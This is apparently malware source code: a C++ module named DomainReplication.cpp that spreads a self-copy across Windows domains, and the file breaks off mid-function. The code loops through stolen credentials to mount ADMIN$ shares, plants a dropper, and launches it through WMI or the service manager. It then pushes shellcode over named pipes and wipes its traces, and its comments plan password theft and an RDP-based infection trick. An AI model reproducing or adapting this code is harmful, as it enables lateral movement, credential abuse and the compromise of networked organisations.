/*
	DomainReplication.cpp
	Routines for replicating self on entire domain(s)

	Case 1: we already have domain admin account, this code is run from some machine (or at any server, DC, etc) with sufficient domain privileges. Machine is domain-joined
	Replicate to all available machines, spread accounts using broadcasting (mailslots), setup named pipe


	Case 2: we have a limited user rights on local machine, can leverage it to LOCAL SYSTEM, but system of our interest is accessed using RDP and 
			2.1 saved credentials (mstsc, rdp autologon, .rdp file itself) - use pony or some similar sources to make password extraction
			2.2 entered credentials (mstsc, username and/or password entered manually) - possibly need some mstsc hooks, or keylog to be parsed somehow, or injecting into rdp session and running a file
			Local machine may be not from any domain or from different domain. Method of replication should take into account:
			1) domain enum may not list servers where user makes rdp to
			2) access level may not allow copy/remote file execution via ADMIN$ share, WMI, SCM. In this case need to use a special rdp infection technic:
				a) set map local disk option in mstsc
				b) set run program on logon option using path \\tsclient\C\<path>\<filename.exe>, so some locally created file will be downloaded and executed on server
				c) run mstsc and perform logon
				So a local copy of a target file will be executed on remote machine. Leave session open for a while to allow installer to make proper actions for elevating/leaving restricted user session/etc 


	Brief methods description
	Name		Access level	Firewall exceptions	Implemented
	SCM  				admin   no					+
	WMI  				admin   yes					+
	Task Scheduler  	admin	yes					-
	RDP					user	no*					in progress
	Wsh Remote			user	?					-				https://msdn.microsoft.com/en-us/library/x9t3ze5y%28v=vs.84%29.aspx
	PowerShell2 remoting ?		?					-				remoting is disabled by default

	Notes on Wsh remote
		The WshRemote object allows you to remotely administer computer systems on a computer network. It represents an instance of a WSH script, 
	that is, a script file with one of the following extensions: .wsh, .wsf, .js, .vbs, .jse, .vbe, and so on. An instance of a running script 
	is a process.
		In WSH version 5.6.6626, which ships with Internet Explorer 6 and Windows XP, a remote script is copied to memory in the remote machine 
	and run from there. In later versions of WSH, such as the one provided by Windows Server 2003, a remote script is copied to the temporary 
	directory of the account that accesses the remote machine. The script is run with the security settings for the remote machine and the 
	temporary directory.

*/

#include <windows.h>
#include <winnetwk.h>	// LPNETRESOURCE def
#include <AclAPI.h>

#pragma comment(lib, "mpr.lib")


#include "..\inc\dbg.h"

#include "..\inc\mem.h"					// ?? possibly no need to be converted to API ??
#include "..\inc\CryptoStrings.h"		// +
#include "..\inc\HashedStrings.h"		// +
#include "..\inc\RandomGen.h"			// +
#include "..\inc\MyStringRoutines.h"	// +
#include "..\inc\MyStreams.h"

#include "..\inc\DomainListMachines.h"	// +
#include "..\inc\CredManager.h"			// +
#include "..\inc\EmbeddedResources.h"	// +
#include "..\inc\SecureClean.h"			// to be moved to ptr
	
#include "..\inc\PipeWorks.h"			// module by ptr may be disabled here, should be the last one

#include "..\shared\config.h"

// internal code modules
#ifdef DOMAIN_REPLICATION_WMI
#include "WMI.h"
#endif

#ifdef DOMAIN_REPLICATION_SCM
#include "SCM.h"
#endif

#ifdef DOMAIN_REPLICATION_RDP
#include "RDP.h"
#endif

#include "DomainReplication.h"


UINT64 g_i64HostMachineNameHash1 = 0, g_i64HostMachineNameHash2 = 0;	// hash of local machine


/*
	Check if passed network name of a machine matches host's name
	Returns TRUE if so.
	wszMachineName is name in format '\\WS-MACHINE-NAME' or 'WS-MACHINE-NAME'
	Comparison is done using global hashes of both name variants
*/
BOOL drIsSelfMachine(LPWSTR wszMachineName)
{
	BOOL bRes = FALSE;	// func result
	LPWSTR wszHostName, wszNetHostName;
	LPWSTR wszS;	// decrypt buffer
	UINT64 i64Hash;	// hash of passed machine name
	DWORD dwBufferLen = MAX_COMPUTERNAME_LENGTH + 1;	// in TCHARs

	if (!wszMachineName) { DbgPrint("ERR: no input param"); return bRes; }

	// check if init needed
	if ((!g_i64HostMachineNameHash1) || (!g_i64HostMachineNameHash2)){

		// init internal buffers
		wszHostName = (LPWSTR)my_alloc(1024);
		wszNetHostName = (LPWSTR)my_alloc(1024);

		if (GetComputerName(wszHostName, &dwBufferLen)) {

			// make net name buffer
			wszS = CRSTRW("\\\\", "\xfd\x3f\xbd\x05\xff\x3f\x81\x31\x52\xc4\x0e");
			lstrcpy(wszNetHostName, wszS);
			lstrcat(wszNetHostName, wszHostName);
			my_free(wszS);

			DbgPrint("local machine name [%ws] or [%ws]", wszHostName, wszNetHostName);

			// calc internal hashes
			g_i64HostMachineNameHash1 = HashStringW(wszHostName);
			g_i64HostMachineNameHash2 = HashStringW(wszNetHostName);

		} else { DbgPrint("ERR: GetComputerName() failed with code %04Xh", GetLastError()); }

		// free resourced
		my_free(wszNetHostName);
		my_free(wszHostName);

	} // init needed

	// calc name hash for compare
	i64Hash = HashStringW(wszMachineName);

	// do compare with both name variants
	if ((i64Hash == g_i64HostMachineNameHash1) || (i64Hash == g_i64HostMachineNameHash2)) {

		DbgPrint("detected local machine");
		bRes = TRUE;

	} // hashes equal


	return bRes;
}



/*
	Wrapper function for connecting and disconnecting remote resources (shares), including establishing NULL session
	Params:
	dra - action type, DRA_CONNECT / DRA_DISCONNECT
	drr - type of a predefined resource to be used, see DRR_TYPE
	wszSpeficResourceName - name of non-standart resource, in case of drr == DRR_SPECIFIED
	wszTargetMachine - remote machine's name in format '\\WS-NAME'
	wszU & wszP - username and password to be used. In case of empty string or NULL ptr, default caller's context will be used for connection. 
				  Not needed for disconnection.
		
*/
BOOL drConnection(DRA_TYPE dra, DRR_TYPE drr, LPWSTR wszSpeficResourceName, LPWSTR wszTargetMachine, LPWSTR wszU, LPWSTR wszP)
{
	BOOL bRes = FALSE;	// func result

	NETRESOURCE nr = { 0 }; // for WNetAddConnection2
	DWORD dwFRes;	

	LPWSTR wszUser = NULL, wszPassword = NULL;
	LPWSTR wszTargetResource;	// buffer to hold target name of remote resource
	LPWSTR wszS = NULL;	// decrypt buffer

	// prepare name
	wszTargetResource = (LPWSTR)my_alloc(1024);
	lstrcpy(wszTargetResource, wszTargetMachine);
	
	// name selection
	switch (drr) {

		case DRR_NULL_SESSION:
			wszS = CRSTRW("\\ipc$", "\xfd\x9f\x39\x05\xf8\x9f\x05\x04\xfd\x84\x9d"); break;

		case DRR_ADMIN_SHARE:
			wszS = CRSTRW("\\ADMIN$", "\xff\xdf\x12\x0c\xf8\xdf\x2e\x25\xcb\xea\xdb\xca\x4b\xc3\x57"); break;

		case DRR_C_SHARE:
			wszS = CRSTRW("\\C$", "\xfe\x5f\xdb\x06\xfd\x5f\xe7\x2d\xaa\x69\x6a"); break;

		case DRR_SPECIFIED:
			if (!wszSpeficResourceName) { DbgPrint("ERR: no wszSpeficResourceName specified"); }

	} // switch DRR_TYPE


	// cat selected part
	if (wszS) { lstrcat(wszTargetResource, wszS);  my_free(wszS); } else { lstrcat(wszTargetResource, wszSpeficResourceName); }


	DbgPrint("targ resource [%ws]", wszTargetResource);


	if (dra == DRA_CONNECT) {


		// fill structure for connecting a remote resource
		nr.dwType = RESOURCETYPE_ANY;
		nr.lpRemoteName = wszTargetResource;

		// select username & password. Default NULL value instruct to use current user's context.
		// If we have another accounts -> try them
		if ((lstrlen(wszU)) && (lstrlen(wszP))) {

			DbgPrint("using passed creds for connection");
			wszUser = wszU;
			wszPassword = wszP;

		}
		else { DbgPrint("no creds passed, using default user context"); }

		// try to connect
		dwFRes = WNetAddConnection2(&nr, wszPassword, wszUser, 0);

		// now check for accepted error codes
		DbgPrint("result = %u", dwFRes);
		if ((NO_ERROR == dwFRes) || (ERROR_ALREADY_ASSIGNED == dwFRes)) { DbgPrint("acceptable result, connected OK"); bRes = TRUE; }
		else { DbgPrint("ERR: connection not established"); }

		// NOTE: typical error when no good creds found is 1326 - ERROR_LOGON_FAILURE
		// 1203 - ERROR_NO_NET_OR_BAD_PATH, 2202 - ERROR_BAD_USERNAME
		// 1219 - ERROR_SESSION_CREDENTIAL_CONFLICT when attempting to access same machine, with different creds

	} // DRA_CONNECT
	
	if (dra == DRA_DISCONNECT) {

		DbgPrint("attemptin disconnection in usual mode");

		dwFRes = WNetCancelConnection2(wszTargetResource, 0, FALSE);

		// check for success
		if (NO_ERROR != dwFRes) {

			DbgPrint("WARN: disconnection failure, code %u", dwFRes);

			// attempt to perform in forced mode, in case of specific error code
			if ((ERROR_DEVICE_IN_USE == dwFRes) || (ERROR_OPEN_FILES == dwFRes)) {

				DbgPrint("received possibly in-use error code, attempting forced disconnection");

				dwFRes = WNetCancelConnection2(wszTargetResource, 0, TRUE);

				// check result
				if (NO_ERROR == dwFRes) {

					DbgPrint("forced disconnection ok");
					bRes = TRUE;

				} else { DbgPrint("no success even in forced mode"); }

			} // in use error code

		} else { DbgPrint("disconnected ok"); bRes = TRUE; }


	} // DRA_DISCONNECT

	// free mem used
	my_free(wszTargetResource);

	// func result
	return bRes;
}


/*
	Generates remote name at ADMIN$ share of target computer, .exe with some rnd name part
	If wszSpecificFile is NULL, uses pseudo-random resulting name, else use wszSpecificFile in format like 'name.ext' to be used as ending
	wszFilenameGenerated if passed, will contain name path relative to ADMIN$ (c:\windows) path

	21-aug-2015: to prevent fill of target machine with many copies when domain replication is working, use machine-dependent name for target file
	Also, it is essential to add that file to a cleaner module
*/
VOID _drGenRemoteName(LPWSTR wszTargetMachine, LPWSTR wszResultName, LPWSTR wszSpecificFile, LPWSTR wszFilenameGenerated)
{
	LPWSTR wszS;	// decrypt buffer
	RndClass rg;	// pseudo-random number generator with rnd seed

	LPWSTR wszP;	// ptr at resulting buffer

	// init rnd object
	rgNew(&rg);
	//rg.rgInitSeedFromTime(&rg);	// previous variant

	// init rnd generator with a seed from target machine's name
	// NB: looks like machine name contains starting left slashes (\\)
	rg.rgInitSeed(&rg, HashStringW_const(wszTargetMachine));

	// copy machine name part
	lstrcpy(wszResultName, wszTargetMachine);

	// add share name with slash
	wszS = CRSTRW("\\ADMIN$\\", "\xfd\xdf\xab\x05\xf5\xdf\x97\x2c\xc9\xea\x62\xc3\x49\x1b\x72");
	lstrcat(wszResultName, wszS);
	my_free(wszS);

	if (!wszSpecificFile) {

		// calc ptr to name part, to be used later
		wszP = (LPWSTR)(wszResultName + lstrlen(wszResultName));

		// do gen at current string's end
		sr_genRandomCharsRG_h(&rg, 8, 15, wszP);

		// append .exe extension
		wszS = CRSTRW(".exe", "\xfd\x7f\x09\x06\xf9\x7f\x47\x0b\xf5\x62\xe6");
		lstrcat(wszResultName, wszS);
		my_free(wszS);

		// copy name part to wszFilenameGenerated, if requested
		if (wszFilenameGenerated) { lstrcpy(wszFilenameGenerated, wszP); DbgPrint("name only = [%ws]", wszFilenameGenerated); }

	} else {

		// concat passed value
		lstrcat(wszResultName, wszSpecificFile);

	}

}

/*
	Attempts to read entire contents of file specified by wszFilename
	Buffer allocated internally and should be disposed by caller
*/
BOOL drReadFileContents(LPWSTR wszFilename, LPVOID *pBuffer, DWORD *dwLen)
{
	BOOL bRes = FALSE;	// func result
	HANDLE hFile;	// file handle
	DWORD dwFSHigh = 0;	// GetFileSize() high part
	DWORD dwRead = 0;	// ReadFile() result

	// check for input
	if ((!pBuffer) || (!dwLen) || (!wszFilename)) { DbgPrint("ERR: invalid input params"); return bRes; }

	// init
	*pBuffer = NULL;
	*dwLen = 0;
	
	// try to open file
	hFile = CreateFile(wszFilename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hFile) {

		// query needed buffer size
		*dwLen = GetFileSize(hFile, &dwFSHigh);

		// check size
		if ((!dwFSHigh) && (*dwLen)) {

			// try to alloc mem
			*pBuffer = my_alloc(*dwLen);
			if (*pBuffer) {

				// allocated ok, read
				ReadFile(hFile, *pBuffer, *dwLen, &dwRead, NULL);

				// check resulting sized
				if (dwRead == *dwLen) {

					DbgPrint("read ok");
					bRes = TRUE;

				} else { DbgPrint("ERR: sizes mismatch when reading [%ws]: expected %u, actual %u", wszFilename, *dwLen, dwRead); }

			} else { DbgPrint("ERR: failed to alloc %u bytes to open [%ws]", *dwLen, wszFilename); }

		} else { DbgPrint("ERR: empty [%ws] filesize: len=%u len_high=%u", wszFilename, *dwLen, dwFSHigh); }

		CloseHandle(hFile);

	} else { DbgPrint("ERR: failed to open for reading file [%ws]", wszFilename); }

	return bRes;
}


/*
	Inits and prepares SECURITY_ATTRIBUTE to add Everyone read/read+execute right
	Returns TRUE on success. Should call drFreeEveryoneREsa() to free resources allocated
*/
BOOL drInitEveryoneREsa(DR_ACCESS_VARS *dav)
{
	BOOL bRes = FALSE;	// func result
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	do {	// not a loop

		// wipe buffer before usage
		memset(dav, 0, sizeof(DR_ACCESS_VARS));

		// in order to remote client be able to read/execute that file, we should allow Everyone r/r+e access to these files
		if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &dav->pEveryoneSID)) { DbgPrint("ERR: sid alloc error %p", GetLastError()); break; }

		// init ACE to allow read + read_exec for everyone
		dav->ea[0].grfAccessPermissions = GENERIC_ALL; // GENERIC_READ | GENERIC_EXECUTE;
		dav->ea[0].grfAccessMode = GRANT_ACCESS; // SET_ACCESS removes all other aces, GRANT_ACCESS adds and leave others
		dav->ea[0].grfInheritance = NO_INHERITANCE;
		dav->ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		dav->ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		dav->ea[0].Trustee.ptstrName = (LPTSTR)dav->pEveryoneSID;

		// create new ACL
		if (ERROR_SUCCESS != SetEntriesInAcl(1, dav->ea, NULL, &dav->pACL)) { DbgPrint("ERR: SetEntriesInAcl() failed, le %p", GetLastError()); break; }

		// init SD
		if (!(dav->pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH))) { DbgPrint("ERR: LocalAlloc() failed"); break; }
		if (!InitializeSecurityDescriptor(dav->pSD, SECURITY_DESCRIPTOR_REVISION))  { DbgPrint("ERR: InitializeSecurityDescriptor() failed, le %p", GetLastError()); break; }

		// Add ACL to descriptor 
		if (!SetSecurityDescriptorDacl(dav->pSD, TRUE, dav->pACL, FALSE))  { DbgPrint("ERR: SetSecurityDescriptorDacl() failed, le %p", GetLastError()); break; }

		// init sa
		dav->sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		dav->sa.lpSecurityDescriptor = dav->pSD;
		dav->sa.bInheritHandle = FALSE;

		// all done ok
		dav->bInited = TRUE;
		bRes = TRUE;

	} while (FALSE);	// not a loop

	return bRes;
}

// deallocates needed vars from drInitEveryoneREsa()
VOID drFreeEveryoneREsa(DR_ACCESS_VARS *dav)
{
	if (!dav->bInited) { return; }

	if (dav->pEveryoneSID) { FreeSid(dav->pEveryoneSID); }
	if (dav->pACL) { LocalFree(dav->pACL); }
	if (dav->pSD) { LocalFree(dav->pSD); }

}

/*
	Attempts to write min dropper file (rse) to already connected ADMIN$ share
	wszTargetMachine format is '\\WS-MACHINE-NAME'
	in case of NULL wszTargetMachine, wszFilenameGenerated should contain a buffer with a path to file to be written
	wszFilenameGenerated will hold only the name part relative to ADMIN$ (c:\windows) path, in case wszTargetMachine != NULL
*/
BOOL drPlantRSEFile(LPWSTR wszTargetMachine, ARCH_TYPE at, LPWSTR wszFilenameGenerated)
{
	BOOL bRes = FALSE;	// function res
	LPWSTR wszTargetName = NULL;	// buffer to hold target's filename
	HANDLE hFile;	// handle to remote file

	// filled by called function which extracts contents of planting file (remote service exe)
	LPVOID pFileBuff = NULL;
	DWORD dwFileLen = 0;

	BOOL bWritten = FALSE;	// flag indicating if a file was written
	DWORD dwWritten = 0;	// WriteFile() result

	// used to read file's contents when it was written to remote machine, for verification
	LPVOID pVerifyFileBuff = NULL;
	DWORD dwVerifyFileBuffLen = 0;

	DR_ACCESS_VARS dav = { 0 };

	if (!wszFilenameGenerated) { DbgPrint("ERR: invalid input params"); return bRes; }
	
	// alloc buffers
	wszTargetName = (LPWSTR)my_alloc(1024);

	if (wszTargetMachine) {

		// gen name for that machine using ADMIN$ share
		_drGenRemoteName(wszTargetMachine, wszTargetName, NULL, wszFilenameGenerated);

	} else {

		//DbgPrint("direct path to write [%ws]", wszFilenameGenerated);
		lstrcpy(wszTargetName, wszFilenameGenerated);
	}


	DbgPrint("target name [%ws]", wszTargetName);

	// prepare sa with Everyone r/re access
	if (!drInitEveryoneREsa(&dav)) { DbgPrint("WARN: failed to init sa"); }

	hFile = CreateFile(wszTargetName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, &dav.sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (INVALID_HANDLE_VALUE != hFile) {

		DbgPrint("file created ok, writing");

		// query contents of planting file to special internal api, using ARCH_TYPE at passed (unk, x32, x64)
		if (erQueryFile(RES_TYPE_RSE, at, &pFileBuff, &dwFileLen, NULL, TRUE)) {

			// write file
			bWritten = WriteFile(hFile, pFileBuff, dwFileLen, &dwWritten, NULL);

			// check written amount against file size. If match -> ok write, proceed to next step
			if (dwFileLen == dwWritten) { DbgPrint("file sizes match"); }

			// not sure if this is essential
			FlushFileBuffers(hFile);

		} else { DbgPrint("WARN: no file to plant"); } // file generated check

		CloseHandle(hFile);

		if (bWritten) {
			
			// check if file is readable after a while, hash is the same - not locked or removed by AV
			// also check size to be >0 or >1024
			DbgPrint("some pre wait before reading file contents for verification..");
			Sleep(2500);
			DbgPrint("reading for verification");

			if (drReadFileContents(wszTargetName, &pVerifyFileBuff, &dwVerifyFileBuffLen)) {

				// compare contents
				if ((dwVerifyFileBuffLen == dwFileLen) && (!memcmp(pVerifyFileBuff, pFileBuff, dwFileLen))) {

					DbgPrint("verify OK");
					bRes = TRUE;

				} else { DbgPrint("ERR: verification failed"); }

				// free buffer allocated by drReadFileContents()
				my_free(pVerifyFileBuff);

			} else { DbgPrint("ERR: failed to read file for verification"); }


		} else { DbgPrint("ERR: failed to write file, removing it"); scSecureDeleteFile(wszTargetName); }

		// free buffer if needed
		if (pFileBuff) { my_free(pFileBuff); }

	} // created ok

	// free mem used
	if (wszTargetName) { my_free(wszTargetName); }
	drFreeEveryoneREsa(&dav);

	return bRes;
}

/*
	Assumes an already connected ADMIN$ share. Reads header of notepad.exe / regedit.exe and check it's arch flags.
	So we determine architecture of remote Windows OS
*/
ARCH_TYPE drQueryRemoteArch(LPWSTR wszTargetMachine)
{
	ARCH_TYPE atResult = ARCH_TYPE_UNKNOWN;	// func result
	LPWSTR wszS;	// decrypt buffer
	LPWSTR wszName;	// name of remote file to be read

	HANDLE hFile;	// remote file handle
	LPVOID pBuff;	// buffer with file's chunk
	DWORD dwRead = 0;   // amount of bytes read

	// ptrs to cast header's values
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;

	// alloc mem
	wszName = (LPWSTR)my_alloc(1024);

	// gen name
	wszS = CRSTRW("notepad.exe", "\xff\x9f\xbb\x09\xf4\x9f\xb5\x0e\xfb\x82\x4b\xe0\x0b\x29\x7e\xd9\x2a\xf9\xd1");
	_drGenRemoteName(wszTargetMachine, wszName, wszS, NULL);
	my_free(wszS);
	DbgPrint("attempting to read [%ws]", wszName);

	hFile = CreateFile(wszName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	if (INVALID_HANDLE_VALUE != hFile) {

		// alloc buffer to hold first 2k
		pBuff = my_alloc(2048);

		// try to read
		ReadFile(hFile, pBuff, 2048, &dwRead, NULL);

		// close file handle anyway
		CloseHandle(hFile);

		// check if anything was read
		if (dwRead == 2048) {

			// read ok, examine buffer for MZPE header
			// to decide on machine's architecture
			dos_header = (PIMAGE_DOS_HEADER)pBuff;
			if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {

				nt_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(pBuff))[dos_header->e_lfanew];
				if (nt_header->Signature == IMAGE_NT_SIGNATURE) {
					
					DbgPrint("PE signatures check ok");
					
					// check arch of file
					if (nt_header->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) { DbgPrint("x64 arch detected"); atResult = ARCH_TYPE_X64; }
					if (nt_header->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) { DbgPrint("x32 arch detected"); atResult = ARCH_TYPE_X32; }

				} else { DbgPrint("ERR: No PE header found"); }

			} else { DbgPrint("ERR: Not a valid executable file"); }

		} else { DbgPrint("ERR: read failed, got %u bytes of %u expected", dwRead, 2048); }
		
		// free mem
		my_free(pBuff);

	} // file opened ok

	// free res
	my_free(wszName);

	return atResult;
}







/*
	Attempt to perform remote execution using different methods, from less invasive to more ones.
	Assumes already established auth session to remote machine
	wszTargetMachine - remote machine name in format '\\WS-MACHINE-NAME'
	wszRemoteFilename - filename placed to ADMIN$ (c:\windows) share, format 'filename.ext'

	NB: methods here assumes admin rights supplied via default context or passed credentials.
*/
BOOL drRemoteAdminExec(LPWSTR wszTargetMachine, LPWSTR wszRemoteFilename, LPWSTR wszUsername, LPWSTR wszPassword)
{
	BOOL bRes = FALSE;	// func result

	// try wmi first
	// it may fail if firewall is misconfigured on target machine
	if (!wmiStartRemoteProcess(wszTargetMachine, wszRemoteFilename, wszUsername, wszPassword)) {

		// if failed, attempt SCM manager - may leave too much logs in systems
		if (scmStartRemoteFileAsServiceAsync(wszTargetMachine, wszRemoteFilename)) { bRes = TRUE; }

	} else  { bRes = TRUE; }

	return bRes;
}

/*
	Called by drAttemptReplication() while shares are still connected, attempting to remove
	file placed at ADMIN$ share of remote machine, identified by wszTargetMachine ('\\WS-MACHINE-NAME')
	wszRemoteName is just 'filename.ext' format
	In case of first attept failed (if file really exists), performs multiple attempts until dwTimeoutSec elapsed
	Waits 250ms between re-attempts
	Returns TRUE if removal was successfull
*/
BOOL drRemoveFileTimeout(LPWSTR wszTargetMachine, LPWSTR wszRemoteName, DWORD dwTimeoutMsec)
{
	BOOL bRes = FALSE;	// func result
	LPWSTR wszDelName;	// internal buffer to hold name for deletion
	DWORD dwMaxTicks = GetTickCount() + dwTimeoutMsec;
	DWORD dwLE;	// last error value
	BOOL bDelRes; // DeleteFile()'s result

	DbgPrint("entered");

	// alloc 
	wszDelName = (LPWSTR)my_alloc(1024);

	// gen name for that machine using ADMIN$ share
	_drGenRemoteName(wszTargetMachine, wszDelName, wszRemoteName, NULL);
	DbgPrint("need to remove [%ws]", wszDelName);

	// attept removal with timeout
	do {

		bDelRes = scSecureDeleteFile(wszDelName);
		if (!bDelRes) { 
			dwLE = GetLastError(); 
			// check for specific error
			if (ERROR_FILE_NOT_FOUND != dwLE) { DbgPrint("WARN: le %u while removing [%ws]", dwLE, wszDelName); Sleep(250); } else { DbgPrint("WARN: file not exists, returning OK result"); bRes = TRUE; } 
		} else {
			// removed ok
			bRes = TRUE; 
			DbgPrint("file removed ok"); 
		}

	} while ((!bDelRes) && (ERROR_FILE_NOT_FOUND != dwLE) && (GetTickCount() < dwMaxTicks));

	// free mem used
	my_free(wszDelName);

	return bRes;
}

/*
	Called by drAttemptReplication() when it detects a pipe ready to accept connections (RSE running on remote side)
	Need to prepare shellcode + modules to be executed as a plain binary chunk and send it via pipes
	Possibly need to use chunked encoding when trasferring large data amounts - to be checked during tests
*/
BOOL drPrepareSendStarterBinpack(LPWSTR wszTargetMachine, ARCH_TYPE at)
{
	BOOL bRes = FALSE;	// func result

	LPVOID pResBuff = NULL;	// resulting binpack buffer, allocated by called function
	DWORD dwResBuffLen = 0;	// ^ len

	LPVOID pContextPtr = NULL;	// ptr at pResBuff to context structure
	LPVOID pExecPtr = NULL;		// ptr at pResBuff to execution start

	// query binpack with shellcode
	if (erGetStarterBinpack(at, &pResBuff, &dwResBuffLen, &pContextPtr, &pExecPtr)) {

		DbgPrint("sending binpack of %u len to machine [%ws]", dwResBuffLen, wszTargetMachine);

		// first item is SHELLCODE_CONTEXT, so remote side will be able to resolve correct exec ptrs
		bRes = _pwRemotePipeCheckSend(wszTargetMachine, 0, 0, pResBuff, dwResBuffLen, NULL, NULL, NULL);

		DbgPrint("send result %u", bRes);

	} else { DbgPrint("ERR: failed to query binpack"); }

	// free resources used
	if (pResBuff) { my_free(pResBuff); }

	return bRes;
}


// attempts replication methods specific for admin access credentials
BOOL drAttemptAdminReplication(LPWSTR wszTargetMachine, LPWSTR wszUsername, LPWSTR wszPassword)
{
	BOOL bRes = FALSE;
	ARCH_TYPE at;	// arch of a remote machine, to select x32 or x64 image

	// established connection's flags
	BOOL bNullSession, bAdminSession;

	LPWSTR wszRemoteName;	// buffer to hold name only part of a file at remote machine

	// attempt to establish NULL session - check if we have sufficient access
	if (!(bNullSession = drConnection(DRA_CONNECT, DRR_NULL_SESSION, NULL, wszTargetMachine, wszUsername, wszPassword))) { DbgPrint("WARN: failed to establish NULL session for [%ws]", wszTargetMachine); }

	// attempt to connect ADMIN$ share
	if (!(bAdminSession = drConnection(DRA_CONNECT, DRR_ADMIN_SHARE, NULL, wszTargetMachine, wszUsername, wszPassword))) { DbgPrint("WARN: failed to establish ADMIN$ share session for [%ws]", wszTargetMachine); }

	// Note: if bNullSession is ok, but bAdminSession fails => insufficient privileges at used context (username+password pair)
	// Possibly this is a good point to mark used creds somehow indicating unsuccessfull connection for a particular machine, so it won't be used in future

	if (bAdminSession) {

		DbgPrint("got ADMIN$ connected");

		// check remote target to be x32 or x64, to use corrent planting exe 
		at = drQueryRemoteArch(wszTargetMachine);

		// alloc wszRemoteName
		wszRemoteName = (LPWSTR)my_alloc(1024);

		// write file to share
		if (drPlantRSEFile(wszTargetMachine, at, wszRemoteName)) {

			// invoke execution of remote process via misc methods (service, wmi, etc...)
			drRemoteAdminExec(wszTargetMachine, wszRemoteName, wszUsername, wszPassword);

			// check if pipe is now working, after some wait for initialization
			// NB: do not wait for too long, due to 30sec timeout in case of SCM run
			// during that time remote side should receive runner stream with all the code
			if (pwIsRemotePipeWorkingTimeout(wszTargetMachine, 20000, 500)) {

				DbgPrint("OK: connection to remote target may be established");

				// prepare and send shellcode + main library packet to be executed on remote side
				if (drPrepareSendStarterBinpack(wszTargetMachine, at)) {

					// if got here, remote side got the data to be executed, assume replication done OK
					// alternatively, may check pipe communication to verify correct installation
					DbgPrint("binpack sent, assume replication performed OK");

					bRes = TRUE;

				} else { DbgPrint("ERR: failute preparing/sending starter binpack to remote side"); }

				// remove file traces on remove machine (shares are still connected at this point)
				drRemoveFileTimeout(wszTargetMachine, wszRemoteName, 30000);

			} else { DbgPrint("ERR: no luck checking connection availability"); }

		} else { DbgPrint("ERR: failed to plant file"); }

		// free mem used
		my_free(wszRemoteName);

	} // bAdminSession

	// remove resourced used
	if (bAdminSession) { drConnection(DRA_DISCONNECT, DRR_ADMIN_SHARE, NULL, wszTargetMachine, NULL, NULL); }
	if (bNullSession) { drConnection(DRA_DISCONNECT, DRR_NULL_SESSION, NULL, wszTargetMachine, NULL, NULL); }


	return bRes;
}

// do concat <domain>\<username>
VOID _drMkUsernameMod(LPWSTR wszRes, LPWSTR wszDomain, LPWSTR wszUsername)
{
	LPWSTR wszS;	// decrypt buffer

	lstrcpy(wszRes, wszDomain);
	wszS = CRSTRW("\\", "\xfd\x1f\x50\x06\xfc\x1f\x6c");
	lstrcat(wszRes, wszS);
	lstrcat(wszRes, wszUsername);

}

/*
	Performs different measures to run self copy on a remote machine
	wszTargetDomain may be NULL
	General algorithm: lookup credentials for that domain in cred manager, attach ADMIN$ share, invoke process and check its working
*/
BOOL drAttemptReplication(LPWSTR wszTargetMachine, LPWSTR wszTargetDomain)
{
	BOOL bRes = FALSE; // func result
	LPWSTR wszUsername = NULL, wszUsernameMod = NULL, wszPassword = NULL;	// local buffers to hold suitable login/password to perform ADMIN$ share mount on target machine
	MY_STREAM msCredsListContext = { 0 };	// stream to hold a list of hashes (domain+username) to make enum of all records belonging to a requested domain
	BOOL bAnyCredsEnumed = FALSE;	// set when any creds were listed in while {} loop

	DbgPrint("entered");

	if (!wszTargetMachine) { DbgPrint("ERR: NULL wszTargetMachine"); return bRes; }

	// alloc buffers
	wszUsername = (LPWSTR)my_alloc(1024);
	wszUsernameMod = (LPWSTR)my_alloc(1024);
	wszPassword = (LPWSTR)my_alloc(1024);

	// init creds list context
	msInitStream(&msCredsListContext);

	do { // not a loop

		

		// enum ALL credentials for that domain (or all available)
		while (cmGetCredentialsForDomain(wszTargetDomain, wszUsername, wszPassword, &msCredsListContext)) {

			DbgPrint("using creds u=[%ws] p=[%ws]", wszUsername, wszPassword);

			bAnyCredsEnumed = TRUE;

			// no domain in username, assume as current
			if (bRes = drAttemptAdminReplication(wszTargetMachine, wszUsername, wszPassword)) { DbgPrint("SUCCESS admin (simple)"); break; }

			// specify target machine name in username, to try local account with same creds
			_drMkUsernameMod(wszUsernameMod, (LPWSTR)((SIZE_T)wszTargetMachine + (2*2) ), wszUsername);
			DbgPrint("mod user: [%ws]", wszUsernameMod);
			if (bRes = drAttemptAdminReplication(wszTargetMachine, wszUsernameMod, wszPassword)) { DbgPrint("SUCCESS admin (local account)"); break; }

			// specify domain name in username, to try for accounts from another domain (rare cases)
			if (wszTargetDomain) {

				_drMkUsernameMod(wszUsernameMod, wszTargetDomain, wszUsername);
				DbgPrint("mod user: [%ws]", wszUsernameMod);
				if (bRes = drAttemptAdminReplication(wszTargetMachine, wszUsernameMod, wszPassword)) { DbgPrint("SUCCESS admin (domain spec)"); break; }


 			} // wszTargetDomain

		}

		if (bRes) { break; }

		// check if nothing was enumed - try admin at current context (low probability of success)
		if (!bAnyCredsEnumed) {

			DbgPrint("WARN: no creds for target domain [%ws]", wszTargetDomain);
			bRes = drAttemptAdminReplication(wszTargetMachine, NULL, NULL);
			break;

		}

#ifdef DOMAIN_REPLICATION_RDP

		// re-init search context and try another infection method
